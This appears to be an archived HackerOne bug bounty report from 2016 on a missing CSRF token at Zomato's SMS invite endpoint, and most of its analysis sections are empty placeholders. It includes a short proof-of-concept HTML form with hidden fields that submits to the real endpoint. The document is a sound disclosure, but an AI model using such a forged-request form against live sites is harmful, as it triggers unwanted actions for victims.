# CSRF AT INVITING PEOPLE THOUGH PHONE NUMBER

## Metadata
- **Source:** HackerOne
- **Report:** 113865 | https://hackerone.com/reports/113865
- **Submitted:** 2016-02-01
- **Reporter:** kiraak-boy
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Violation of Secure Design Principles
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

Please Add CSRF Token While Inviting The User Though Phone Number , You Have Good Rate Limit Protection But At The Same Time Add CSRF TOKEN :-

CODE :-

<html>
<body>
<form action="https://www.zomato.com/php/restaurantSmsHandler">
<input type="hidden" name="type" value="zomato&#45;app&#45;details" />
<input type="hidden" name="mobile&#95;no" value="xxxxxxxxxxxxxx" />
<input type="submit" v

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

Please Add CSRF Token While Inviting The User Though Phone Number , You Have Good Rate Limit Protection But At The Same Time Add CSRF TOKEN :-

CODE :-

<html>
<body>
<form action="https://www.zomato.com/php/restaurantSmsHandler">
<input type="hidden" name="type" value="zomato&#45;app&#45;details" />
<input type="hidden" name="mobile&#95;no" value="xxxxxxxxxxxxxx" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

Thanks!

</details>

---
*Analysed by Claude on 2026-05-24*
